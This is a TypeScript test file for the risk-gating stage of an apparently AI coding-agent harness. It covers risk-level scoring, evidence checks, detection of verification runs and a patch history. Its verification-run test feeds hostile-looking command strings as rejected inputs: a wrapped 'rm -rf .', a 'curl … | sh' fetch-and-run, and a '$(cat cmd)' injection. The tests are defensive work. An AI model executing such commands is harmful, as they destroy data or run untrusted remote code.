import { describe, expect, it } from 'vitest';
import type { Answer, JsonObject, Proposal, ProposalEvidence } from '../../../src/core/types.js';
import { assertQuestionBatch } from '../../../src/jev/questions.js';
import { EVIDENCE_CONSISTENT_ID, RISK_BLOCK, RISK_REVIEW, RISK_LEVEL_TEXTS, VERIFICATION_HARM_MAX_LEVEL, assessRisk, buildRiskQuestions, classifyPatchResult, completionVerifiedByRun, createPatchHistory, evidenceSummary, novelVerifiedPatch, patchHistoryFor, patchSites, riskLevelTexts } from '../../../src/loop/stages/risk.js';
import { isVerificationRun } from '../../../src/workspace/tests.js';
import { buildCommonState, buildRiskState, type PriorPatch } from '../../../src/loop/state.js';
import { emptyPlan } from '../../../src/loop/plan.js';
import { noulA, scoreA } from './fakes.js';

function all(levels: Record<number, number>): Record<string, Answer> {
  return { destructive: scoreA(levels), out_of_scope: scoreA({ 0: 1 }), plan_mismatch: scoreA({ 0: 1 }), irreversible: scoreA({ 0: 1 }), matches_intent: noulA(0.9) };
}

describe('risk mapping table (§5.3, §14)', () => {
  const table: [Record<number, number>, number, 'ok' | 'review' | 'block'][] = [
    [{ 1: 0.8, 2: 0.2 }, 0.3, 'review'],
    [{ 1: 0.85, 2: 0.15 }, 0.2875, 'ok'],
    [{ 1: 0.9, 3: 0.1 }, 0.3, 'review'],
    [{ 1: 1.0 }, 0.25, 'ok'],
    [{ 2: 1.0 }, 0.5, 'review'],
    [{ 3: 0.7, 2: 0.3 }, 0.7, 'block'],
    // DESIGN.md §5.3 lists this row as 0.70; the tail term P(k>=3)=0.80 dominates: max(0.70, 0.80).
    [{ 3: 0.8, 2: 0.2 }, 0.8, 'block'],
    [{ 3: 0.8, 0: 0.2 }, 0.8, 'block'],
    [{ 4: 0.7, 0: 0.3 }, 0.7, 'block'],
    [{ 0: 0.5, 4: 0.5 }, 0.5, 'review'],
    [{ 0: 0.1, 3: 0.9 }, 0.9, 'block'],
    [{ 0: 0.7, 3: 0.3 }, 0.3, 'review'],
    [{ 2: 0.25, 3: 0.75 }, 0.75, 'block'],
  ];
  for (const [levels, risk, verdict] of table) {
    it(`${JSON.stringify(levels)} -> ${risk} ${verdict}`, () => {
      const r = assessRisk(all(levels), 0.9, 'edit');
      expect(r.risk).toBeCloseTo(risk, 6);
      expect(r.verdict).toBe(verdict);
      expect(r.dims.destructive.risk).toBeCloseTo(risk, 6);
    });
  }
  it('the verdict is independent of the summation order of the probability map', () => {
    const a = scoreA({ 3: 0.7, 2: 0.3 });
    if (a.type !== 'score') throw new Error();
    const reversed: Record<string, number> = {};
    for (const k of Object.keys(a.probabilities).reverse()) reversed[k] = a.probabilities[k]!;
    const b: Answer = { ...a, probabilities: reversed };
    expect(assessRisk({ ...all({}), destructive: b }, 0.9, 'edit').verdict).toBe('block');
    expect(assessRisk({ ...all({}), destructive: a }, 0.9, 'edit').risk).toBe(assessRisk({ ...all({}), destructive: b }, 0.9, 'edit').risk);
  });
  it('the reason names the dimension(s) at the max, the bound, the dominant level text and the confidence; matches_intent < 0.3 is appended only for review/block', () => {
    const r = assessRisk({ destructive: scoreA({ 0: 0.1, 3: 0.9 }), out_of_scope: scoreA({ 0: 1 }), plan_mismatch: scoreA({ 0: 0.1, 3: 0.9 }), irreversible: scoreA({ 1: 1 }), matches_intent: noulA(0.2) }, 0.2, 'edit');
    expect(r.verdict).toBe('block');
    expect(r.reason).toMatch(/^risk 0\.90 \(block\) from destructive: 0\.90 probability of level 3 or above; dominant level 3 ".*mass deletion.*"; Jev confidence 0\.\d\d \| plan_mismatch: 0\.90 probability of level 3 or above/);
    expect(r.reason).toContain('does not carry out intent `edit` (matches_intent=0.20)');
    expect(r.dims.irreversible).toMatchObject({ level: 1, risk: 0.25, bound: 'expected' });
    const ok = assessRisk(all({ 0: 1 }), 0.1, 'edit');
    expect(ok.reason).not.toContain('matches_intent');
    expect(ok.reason).toMatch(/expected level 0\.00 of 4/);
  });
  it('questions: four one-quantity 5-level Scores with the exact level texts and a matches_intent Noul with both-sided criteria; thresholds exported', () => {
    const qs = buildRiskQuestions();
    expect(Object.keys(qs)).toEqual(['destructive', 'out_of_scope', 'plan_mismatch', 'irreversible', 'matches_intent']);
    for (const dim of ['destructive', 'out_of_scope', 'plan_mismatch', 'irreversible'] as const) {
      const q = qs[dim]!;
      expect(q.type).toBe('score');
      if (q.type === 'score') expect(q.criteria).toEqual([...RISK_LEVEL_TEXTS[dim]]);
      expect(String(q.instructions)).toContain('`proposal.action`');
    }
    expect(RISK_LEVEL_TEXTS.destructive[0]).toMatch(/^nothing existing is lost/);
    expect(RISK_LEVEL_TEXTS.irreversible[4]).toBe('cannot be reversed');
    const mi = qs['matches_intent']!;
    expect(mi.type).toBe('noul');
    if (mi.type === 'noul') expect((mi.criteria!.true as { examples: string[] }).examples.length).toBeGreaterThanOrEqual(2);
    expect(RISK_REVIEW).toBe(0.3);
    expect(RISK_BLOCK).toBe(0.7);
  });
});

describe('risk with proposal.evidence (jev-only shadow test run)', () => {
  const evidence: ProposalEvidence = {
    kind: 'shadow_test_run',
    command: 'python3 -m pytest -q',
    before: { passed: 7, failed: 3, errors: 0, total: 10 },
    after: { passed: 8, failed: 2, errors: 0, total: 10 },
    newlyPassing: ['tests/test_g.py::test_weighted'],
    newlyFailing: [],
    goalTests: ['tests/test_g.py::test_weighted'],
    selection: 'sieve',
    candidatesTested: 360,
    arbitrated: false,
  };
  it('questions: the same four one-quantity Scores plus `evidence_consistent`; only out_of_scope[0], plan_mismatch[2], [3] and [4] mention the evidence or the claiming-run rule; the default set is untouched', () => {
    const qs = buildRiskQuestions({ evidence: true });
    expect(Object.keys(qs)).toEqual(['destructive', 'out_of_scope', 'plan_mismatch', 'irreversible', 'matches_intent', EVIDENCE_CONSISTENT_ID]);
    assertQuestionBatch(qs);
    const texts = riskLevelTexts(true);
    expect(texts.destructive).toBe(RISK_LEVEL_TEXTS.destructive);
    expect(texts.irreversible).toBe(RISK_LEVEL_TEXTS.irreversible);
    expect(texts.out_of_scope[0]).toContain('`proposal.evidence.goalTests`');
    expect(texts.out_of_scope.slice(1)).toEqual(RISK_LEVEL_TEXTS.out_of_scope.slice(1));
    expect(texts.plan_mismatch[2]).toMatch(/^skips a planned verification step; an action whose `proposal\.evidence\.verified` is true/);
    expect(texts.plan_mismatch[4]).toContain('a blocked or declined proposal in `recent` never ran');
    expect(texts.plan_mismatch[4]).toContain('a test `run` after a change');
    expect([texts.plan_mismatch[0], texts.plan_mismatch[1]]).toEqual([RISK_LEVEL_TEXTS.plan_mismatch[0], RISK_LEVEL_TEXTS.plan_mismatch[1]]);
    expect(texts.plan_mismatch[3]).toMatch(/^ignores the plan's open problems/);
    expect(texts.plan_mismatch[3]).toContain('a test `run` is never a completion claim');
    for (const dim of ['out_of_scope', 'plan_mismatch'] as const) expect(String(qs[dim]!.instructions)).toContain('`proposal.evidence`');
    for (const dim of ['destructive', 'irreversible'] as const) expect(qs[dim]).toEqual(buildRiskQuestions()[dim]);
    expect(Object.keys(buildRiskQuestions())).toEqual(['destructive', 'out_of_scope', 'plan_mismatch', 'irreversible', 'matches_intent']);
    expect(riskLevelTexts(false)).toBe(RISK_LEVEL_TEXTS);
    const ec = qs[EVIDENCE_CONSISTENT_ID]!;
    expect(String(ec.instructions)).toBe('Do `proposal.evidence` and `recent` agree, i.e. is the claimed test progress plausible given the previous runs?');
  });
  it('a verified patch with level-0/1 Scores is ok whatever evidence_consistent says; the reason names the evidence and the proposal', () => {
    const answers = { destructive: scoreA({ 1: 1 }), out_of_scope: scoreA({ 0: 1 }), plan_mismatch: scoreA({ 0: 0.9, 1: 0.1 }), irreversible: scoreA({ 0: 1 }), matches_intent: noulA(0.9), [EVIDENCE_CONSISTENT_ID]: noulA(0.1) };
    const r = assessRisk(answers, 0.9, 'edit', { evidenceConsistent: 0.1, evidence, goal: 'apply verified fix: tests/test_g.py::test_weighted now passes (7→8 of 10), no regressions; donor/replace at src/g.py:28', texts: riskLevelTexts(true) });
    expect(r.verdict).toBe('ok');
    expect(r.risk).toBeCloseTo(0.25, 6);
    expect(r.reason).toContain('; evidence verified: 7→8 of 10 pass, no regressions (sieve, 360 tested); proposal: apply verified fix: tests/test_g.py::test_weighted now passes (7→8 of 10), no regressions; donor/replace at src/g.py:28');
    expect(r.reason).not.toContain(EVIDENCE_CONSISTENT_ID);
    expect(evidenceSummary({ ...evidence, newlyFailing: ['t'], arbitrated: true, selection: 'rank' })).toBe('evidence unverified: 7→8 of 10 pass, 1 regression (rank, 360 tested, arbitrated)');
  });
  it('on review/block the reason adds evidence_consistent < 0.3 (reason text only) and clips the long evidence level text so the evidence line fits the window', () => {
    const answers = { destructive: scoreA({ 0: 1 }), out_of_scope: scoreA({ 0: 1 }), plan_mismatch: scoreA({ 4: 1 }), irreversible: scoreA({ 0: 1 }), matches_intent: noulA(0.9), [EVIDENCE_CONSISTENT_ID]: noulA(0.12) };
    const r = assessRisk(answers, 0.9, 'edit', { evidenceConsistent: 0.12, evidence, goal: 'g', texts: riskLevelTexts(true) });
    expect(r.verdict).toBe('block');
    expect(r.reason).toContain(`Jev judged the evidence inconsistent with recent (${EVIDENCE_CONSISTENT_ID}=0.12)`);
    expect(r.reason).toMatch(/dominant level 4 "contradicts the plan, repeats a step[^"]*…"/);
    expect(r.reason.length).toBeLessThan(600);
    // the same Scores without evidence: the §5.5 text quoted whole, nothing appended
    const plain = assessRisk(answers, 0.9, 'edit');
    expect(plain.reason).toContain(`dominant level 4 "${RISK_LEVEL_TEXTS.plan_mismatch[4]}"`);
    expect(plain.reason).not.toContain('evidence');
  });
});

describe('ladder-4 analysis fixes: the verification run (Fix 2) and the verified done (Fix 1)', () => {
  // calendar_utils step 13 of bench/results/jev-only-ladder-4: `python3 -m pytest -q` after the last fix, declined at review 0.43 with Jev confidence 0.00
  const spreadMass = { destructive: scoreA({ 0: 0.98, 1: 0.02 }), out_of_scope: scoreA({ 0: 0.89, 1: 0.02, 4: 0.09 }), plan_mismatch: scoreA({ 0: 0.31, 1: 0.06, 2: 0.2, 3: 0.18, 4: 0.25 }), irreversible: scoreA({ 0: 0.99, 1: 0.01 }), matches_intent: noulA(0.9) };
  const pytest = { command: 'pytest -q', runner: 'pytest' as const };

  it('a spread-mass plan_mismatch answer is review for an ordinary action but ok for a verification run; the alignment dims stay in dims and the reason', () => {
    const plain = assessRisk(spreadMass, 0.9, 'verify');
    expect(plain.verdict).toBe('review');
    expect(plain.risk).toBeCloseTo(0.43, 6);
    const run = assessRisk(spreadMass, 0.9, 'verify', { verificationRun: true });
    expect(run.verdict).toBe('ok');
    // destructive at expected level 0.02 of 4 is the only gating term left
    expect(run.risk).toBeCloseTo(0.005, 6);
    // Jev's alignment answers are recorded, not gating
    expect(run.dims.plan_mismatch).toMatchObject({ risk: plain.dims.plan_mismatch.risk, level: 0, bound: 'tail' });
    expect(run.dims.out_of_scope.risk).toBeCloseTo(0.09, 6);
    expect(run.reason).toMatch(/^risk 0\.01 \(ok\) from destructive: expected level 0\.02 of 4; dominant level 0 "nothing existing is lost/);
    expect(run.reason).toContain('; verification run of the workspace test command: out_of_scope 0.09 (dominant level 0), plan_mismatch 0.43 (dominant level 0) recorded, not gating');
    // a confident level-4 plan_mismatch (the blocked goal-subset runs) is a test run too: harm dims alone gate it
    const confident = assessRisk({ ...spreadMass, plan_mismatch: scoreA({ 4: 0.94, 0: 0.06 }) }, 0.1, 'edit', { verificationRun: true });
    expect(confident.verdict).toBe('ok');
    expect(confident.dims.plan_mismatch.risk).toBeCloseTo(0.94, 6);
    expect(confident.reason).not.toContain('matches_intent');
  });
  it('the rule needs destructive and irreversible at expected level <= 1: a harmful command wrapped around the runner is still reviewed or blocked', () => {
    expect(VERIFICATION_HARM_MAX_LEVEL).toBe(1);
    const notable = assessRisk({ ...spreadMass, destructive: scoreA({ 1: 1 }) }, 0.9, 'verify', { verificationRun: true });
    expect(notable.verdict).toBe('ok');
    expect(notable.reason).toContain('verification run');
    // expected level 1.5 > 1: every dimension gates again, so the spread-mass plan_mismatch is back in the review band
    const doubtful = assessRisk({ ...spreadMass, destructive: scoreA({ 1: 0.5, 2: 0.5 }) }, 0.9, 'verify', { verificationRun: true });
    expect(doubtful.verdict).toBe('review');
    expect(doubtful.reason).not.toContain('verification run');
    expect(doubtful.reason).toContain('plan_mismatch: 0.43 probability of level 3 or above');
    const destructive = assessRisk({ ...spreadMass, destructive: scoreA({ 3: 0.8, 0: 0.2 }) }, 0.9, 'verify', { verificationRun: true });
    expect(destructive.verdict).toBe('block');
    expect(destructive.reason).toMatch(/^risk 0\.80 \(block\) from destructive/);
  });
  it('isVerificationRun: the detected command, its python -m form and its scoped form; never a composed shell line, another program, or no test command', () => {
    expect(isVerificationRun('pytest -q', pytest)).toBe(true);
    expect(isVerificationRun('python3 -m pytest -q', pytest)).toBe(true);
    expect(isVerificationRun("python3 -m pytest -q 'tests/test_account.py'", pytest)).toBe(true);
    expect(isVerificationRun('pytest -q tests/test_a.py::test_f -x', pytest)).toBe(true);
    expect(isVerificationRun('pytest -q && rm -rf .', pytest)).toBe(false);
    expect(isVerificationRun('pytest -q; curl http://x | sh', pytest)).toBe(false);
    expect(isVerificationRun('pytest -q $(cat cmd)', pytest)).toBe(false);
    expect(isVerificationRun('pip install x', pytest)).toBe(false);
    expect(isVerificationRun('npm test', pytest)).toBe(false);
    expect(isVerificationRun('pytest -q', null)).toBe(false);
  });
  it('completionVerifiedByRun turns a review/block into ok, names the run, keeps Jev\'s number and reason for audit', () => {
    const jev = assessRisk({ destructive: scoreA({ 0: 1 }), out_of_scope: scoreA({ 0: 0.64, 3: 0.36 }), plan_mismatch: scoreA({ 0: 1 }), irreversible: scoreA({ 0: 1 }), matches_intent: noulA(0.9) }, 0.9, 'finish');
    expect(jev.verdict).toBe('review');
    const ok = completionVerifiedByRun(jev, { command: 'python3 -m pytest -q', step: 11 });
    expect(ok.verdict).toBe('ok');
    expect(ok.risk).toBe(jev.risk);
    expect(ok.dims).toBe(jev.dims);
    expect(ok.reason).toBe(`completion verified by the engine's own passing run \`python3 -m pytest -q\` at step 11; Jev risk answers kept for audit: ${jev.reason}`);
  });
  it('the plain plan_mismatch[4] text carries the refused-proposal and green-run clauses (a `done` never carries evidence, so it reads the plain text); [3] is unchanged', () => {
    expect(RISK_LEVEL_TEXTS.plan_mismatch[4]).toContain('a blocked or declined proposal in `recent` never ran, so it is not a step that failed');
    expect(RISK_LEVEL_TEXTS.plan_mismatch[4]).toContain('a `done` while `workspace.testsCurrent` is true and `workspace.lastTestRun.allPassed` is true follows a verifying run and is not such a claim');
    expect(RISK_LEVEL_TEXTS.plan_mismatch[4]).toMatch(/^contradicts the plan, repeats a step `recent` shows already failed the same way/);
    expect(RISK_LEVEL_TEXTS.plan_mismatch[3]).toBe('ignores the plan\'s open problems, or claims completion (`done`) while `plan.remaining` is non-empty');
    expect(riskLevelTexts(true).plan_mismatch[4]).toContain('a blocked or declined proposal in `recent` never ran so it did not fail');
  });
});

describe('item 3 (rungs report §17): prior patches — the django-15315 sequence', () => {
  const ev = (before: number, after: number, total = 357, newlyFailing: string[] = []): ProposalEvidence => ({
    kind: 'shadow_test_run',
    command: 'python tests/runtests.py --parallel 1 --settings=test_sqlite',
    before: { passed: before, failed: total - before, errors: 0, total },
    after: { passed: after, failed: total - after, errors: 0, total },
    newlyPassing: after > before ? ['repro::e7fbbfa8'] : [],
    newlyFailing,
    goalTests: ['repro::e7fbbfa8'],
    selection: 'sieve',
    candidatesTested: 13,
    arbitrated: true,
  });
  const diffA = '--- a/django/db/models/fields/__init__.py\n+++ b/django/db/models/fields/__init__.py\n@@ -547,6 +547,7 @@ class Field:\n     def __hash__(self):\n-        return hash((self.creation_counter, self.model))\n+        return hash(self.creation_counter)\n';
  const diffB = '--- a/django/db/models/fields/reverse_related.py\n+++ b/django/db/models/fields/reverse_related.py\n@@ -137,7 +137,8 @@ class ForeignObjectRel:\n-    x = 1\n+    x = 2\n+    y = 3\n';
  const patch = (diff: string, evidence: ProposalEvidence): Proposal => ({ goal: 'apply verified fix', action: { kind: 'patch', diff }, plan: { done: [], remaining: ['verify'], openProblems: [] }, rawText: '', evidence });
  const run = (step: number, passed: number, failed = 0): { step: number; command: string; passed: number; failed: number; errors: number; allPassed: boolean } => ({ step, command: 'python tests/runtests.py', passed, failed, errors: 0, allPassed: failed === 0 && passed > 0 });
  /** the common state at `step`: recent = the outcomes of the given earlier steps, lastTestRun as recorded */
  const common = (step: number, recent: [number, string, 'executed' | 'blocked' | 'declined' | 'failed' | 'noop'][], lastTestRun: ReturnType<typeof run> | null, lastChangeStep: number | null): JsonObject =>
    buildCommonState({
      task: 'django-15315',
      plan: emptyPlan(),
      recent: recent.map(([s, action, outcome]) => ({ step: s, intent: null, action, outcome, shownFiles: [], notes: [] })),
      workspace: { root: '/ws', git: true, hasTests: true, testCommand: 'python tests/runtests.py', changedFiles: [], createdThisRun: [], lastChangeStep, lastTestRun, sandbox: 'none' },
      budget: { stepsUsed: step, stepsMax: 20, spentUsd: 0, capUsd: 0.3 },
      redact: (x) => x,
    });

  it('patchSites: path:line per hunk (new-file start), the path for edit/write, touched paths when a diff has no hunks', () => {
    expect(patchSites({ kind: 'patch', diff: diffA })).toEqual(['django/db/models/fields/__init__.py:547']);
    expect(patchSites({ kind: 'patch', diff: `${diffA}${diffB}` })).toEqual(['django/db/models/fields/__init__.py:547', 'django/db/models/fields/reverse_related.py:137']);
    expect(patchSites({ kind: 'edit', path: 'src/a.py', old: 'x', new: 'y' })).toEqual(['src/a.py']);
    expect(patchSites({ kind: 'patch', diff: '--- a/x.py\n+++ b/x.py\n' })).toEqual(['x.py']);
    expect(patchSites({ kind: 'run', command: 'ls' })).toEqual([]);
  });

  it('the history: patch A applied at 3, the re-baseline at 4 kept the suite green but not A\'s gain; B at 5 sees A as applied / not_fixed / different content and is a novel verified patch; B re-proposed at 6 after a block sees B as refused and is still novel; an identical applied patch is not', () => {
    const h = createPatchHistory();
    const A = patch(diffA, ev(328, 329));
    // step 3: A assessed; baseline run at step 1
    expect(h.observe(3, A, common(3, [[1, 'run', 'executed'], [2, 'read', 'executed']], run(1, 328), null))).toEqual([]);
    // step 4: the verification run is assessed; recent now shows A executed
    expect(h.observe(4, { goal: 'verify', action: { kind: 'run', command: 'python tests/runtests.py' }, plan: { done: [], remaining: [], openProblems: [] }, rawText: '' }, common(4, [[1, 'run', 'executed'], [2, 'read', 'executed'], [3, 'patch django/db/models/fields/__init__.py', 'executed']], run(1, 328), 3))).toEqual([]);
    // step 5: B (different content, same shadow gain claim) — its baseline is still 328/357, so A's gain did not hold
    const B = patch(diffB, ev(328, 329));
    const priorsAt5 = h.observe(5, B, common(5, [[2, 'read', 'executed'], [3, 'patch django/db/models/fields/__init__.py', 'executed'], [4, 'run python tests/runtests.py', 'executed']], run(4, 328), 3));
    expect(priorsAt5).toEqual<PriorPatch[]>([
      { step: 3, kind: 'patch', sites: ['django/db/models/fields/__init__.py:547'], status: 'executed', applied: true, result: 'not_fixed', sameContent: false, runAfter: { step: 4, passed: 328, failed: 0, errors: 0, allPassed: true }, goalHeld: false },
    ]);
    expect(novelVerifiedPatch(B, priorsAt5)).toBe(true);
    // step 6: B again after a block at 5 — B is refused (never ran), so the re-proposal is not a repeat of a failure
    const priorsAt6 = h.observe(6, B, common(6, [[3, 'patch django/db/models/fields/__init__.py', 'executed'], [4, 'run python tests/runtests.py', 'executed'], [5, 'patch django/db/models/fields/reverse_related.py', 'blocked']], run(4, 328), 3));
    expect(priorsAt6.map((p) => [p.step, p.result, p.sameContent, p.applied])).toEqual([[3, 'not_fixed', false, true], [5, 'refused', true, false]]);
    expect(novelVerifiedPatch(B, priorsAt6)).toBe(true);
    // an identical re-proposal of the *applied* A is not novel; an unverified or regressing patch is not either
    const priorsA = h.observe(7, A, common(7, [[5, 'patch', 'blocked'], [6, 'patch', 'blocked']], run(4, 328), 3));
    expect(priorsA.find((p) => p.step === 3)).toMatchObject({ sameContent: true, applied: true });
    expect(novelVerifiedPatch(A, priorsA)).toBe(false);
    expect(novelVerifiedPatch(patch(diffB, ev(328, 328)), priorsAt5)).toBe(false);
    expect(novelVerifiedPatch(patch(diffB, ev(328, 329, 357, ['tests/x::y'])), priorsAt5)).toBe(false);
    expect(novelVerifiedPatch({ goal: B.goal, action: B.action, plan: B.plan, rawText: '' }, priorsAt5)).toBe(false);
    // a retried stage replaces the step's entry; the state round-trips
    expect(createPatchHistory(h.toState()).toState()).toEqual(h.toState());
    expect(h.toState().attempts.map((a) => a.step)).toEqual([3, 5, 6, 7]);
  });

  it('classifyPatchResult from facts: refused/failed by status; regressed, fixed, progressed, no_change, unverified from the runs; not_fixed from a re-baseline that lost the gain', () => {
    const base = { step: 3, kind: 'patch' as const, hash: 'h', sites: [], evidence: null, status: 'executed' as const, runBefore: { step: 1, passed: 7, failed: 3, errors: 0, allPassed: false }, runAfter: null };
    expect(classifyPatchResult({ ...base, status: 'blocked' }, undefined).result).toBe('refused');
    expect(classifyPatchResult({ ...base, status: 'failed' }, undefined).result).toBe('failed');
    expect(classifyPatchResult(base, undefined).result).toBe('unverified');
    expect(classifyPatchResult({ ...base, runAfter: { step: 4, passed: 6, failed: 4, errors: 0, allPassed: false } }, undefined).result).toBe('regressed');
    expect(classifyPatchResult({ ...base, runAfter: { step: 4, passed: 10, failed: 0, errors: 0, allPassed: true } }, undefined).result).toBe('fixed');
    expect(classifyPatchResult({ ...base, runAfter: { step: 4, passed: 8, failed: 2, errors: 0, allPassed: false } }, undefined).result).toBe('progressed');
    expect(classifyPatchResult({ ...base, runAfter: { step: 4, passed: 7, failed: 3, errors: 0, allPassed: false } }, undefined).result).toBe('no_change');
    const withEv = { ...base, evidence: { beforePassed: 328, afterPassed: 329, total: 357 }, runBefore: { step: 1, passed: 328, failed: 0, errors: 0, allPassed: true }, runAfter: { step: 4, passed: 328, failed: 0, errors: 0, allPassed: true } };
    expect(classifyPatchResult(withEv, ev(328, 329))).toEqual({ result: 'not_fixed', goalHeld: false });
    expect(classifyPatchResult(withEv, ev(329, 330))).toEqual({ result: 'fixed', goalHeld: true });
    // a different suite size: no comparison
    expect(classifyPatchResult(withEv, ev(5, 6, 10)).goalHeld).toBeNull();
  });

  it('assessRisk: an identical applied patch is still blocked on plan_mismatch level 4; a novel verified patch with plan_mismatch {0: 0.5, 4: 0.5} is ok (alignment recorded, not gating); harm still gates', () => {
    const texts = riskLevelTexts(true);
    const repeat = { destructive: scoreA({ 1: 1 }), out_of_scope: scoreA({ 0: 1 }), plan_mismatch: scoreA({ 4: 0.9, 3: 0.1 }), irreversible: scoreA({ 0: 1 }), matches_intent: noulA(0.9), [EVIDENCE_CONSISTENT_ID]: noulA(0.8) };
    // the stage passes no novelPatch option when the content matches an applied earlier patch
    const blocked = assessRisk(repeat, 0.9, 'edit', { evidenceConsistent: 0.8, evidence: ev(328, 329), goal: 'g', texts });
    expect(blocked.verdict).toBe('block');
    expect(blocked.reason).not.toContain('verified novel patch');
    const spread = { destructive: scoreA({ 1: 1 }), out_of_scope: scoreA({ 0: 0.36, 2: 0.11, 3: 0.35, 4: 0.17 }), plan_mismatch: scoreA({ 0: 0.5, 4: 0.5 }), irreversible: scoreA({ 0: 1 }), matches_intent: noulA(0.9), [EVIDENCE_CONSISTENT_ID]: noulA(0.2) };
    const plain = assessRisk(spread, 0.9, 'edit', { evidenceConsistent: 0.2, evidence: ev(328, 329), goal: 'g', texts });
    expect(plain.verdict).toBe('review');
    const novel = assessRisk(spread, 0.9, 'edit', { evidenceConsistent: 0.2, evidence: ev(328, 329), goal: 'g', texts, novelPatch: { priorPatches: 1 } });
    expect(novel.verdict).toBe('ok');
    expect(novel.risk).toBeCloseTo(0.25, 6);
    // {0: 0.5, 4: 0.5}: tail mass 0.5, argmax level 0 (the tie resolves to the lower level)
    expect(novel.dims.plan_mismatch).toMatchObject({ risk: 0.5, level: 0, tailMass: 0.5 });
    expect(novel.dims.out_of_scope.risk).toBeCloseTo(0.52, 6);
    expect(novel.reason).toContain('; verified novel patch (evidence verified, no regressions, content differs from every applied earlier patch; 1 earlier patch this run): out_of_scope 0.52 (dominant level 0), plan_mismatch 0.50 (dominant level 0) recorded, not gating');
    expect(novel.reason).not.toContain(EVIDENCE_CONSISTENT_ID);
    const harmful = assessRisk({ ...spread, destructive: scoreA({ 3: 0.8, 1: 0.2 }) }, 0.9, 'edit', { evidenceConsistent: 0.2, evidence: ev(328, 329), goal: 'g', texts, novelPatch: { priorPatches: 2 } });
    expect(harmful.verdict).toBe('block');
    expect(harmful.reason).not.toContain('verified novel patch');
    expect(texts.plan_mismatch[4]).toContain('a different verified patch after an earlier patch that did not fix the goal is a new attempt, not a repeat');
    expect(texts.plan_mismatch[4]).toContain('`priorPatches[].sameContent` and `applied` both true');
    expect(RISK_LEVEL_TEXTS.plan_mismatch[4]).not.toContain('priorPatches');
  });

  it('the state block appears for patches only; per-runId histories reset when a run restarts at an earlier step', () => {
    const priors: PriorPatch[] = [{ step: 3, kind: 'patch', sites: ['a.py:1'], status: 'executed', applied: true, result: 'not_fixed', sameContent: false, runAfter: null, goalHeld: false }];
    const c = common(5, [], run(4, 328), 3);
    const intent = { choice: 'edit' as const, probability: 0.9 };
    const ps = buildRiskState(c, patch(diffB, ev(328, 329)), intent, [], (x) => x, priors);
    expect((ps['proposal'] as JsonObject)['priorPatches']).toEqual([{ step: 3, kind: 'patch', sites: ['a.py:1'], status: 'executed', applied: true, result: 'not_fixed', sameContent: false, runAfter: null, goalHeld: false }]);
    const rs = buildRiskState(c, { goal: 'v', action: { kind: 'run', command: 'pytest -q' }, plan: { done: [], remaining: [], openProblems: [] }, rawText: '' }, intent, [], (x) => x, priors);
    expect((rs['proposal'] as JsonObject)['priorPatches']).toBeUndefined();
    expect((buildRiskState(c, patch(diffB, ev(328, 329)), intent, [], (x) => x)['proposal'] as JsonObject)['priorPatches']).toBeUndefined();
    const h1 = patchHistoryFor('run-x', 3);
    h1.observe(3, patch(diffA, ev(1, 2, 3)), c);
    expect(patchHistoryFor('run-x', 4)).toBe(h1);
    // a new run under the same id starts at step 1: the stale history is dropped
    const h2 = patchHistoryFor('run-x', 1);
    expect(h2).not.toBe(h1);
    expect(h2.toState().attempts).toEqual([]);
  });
});
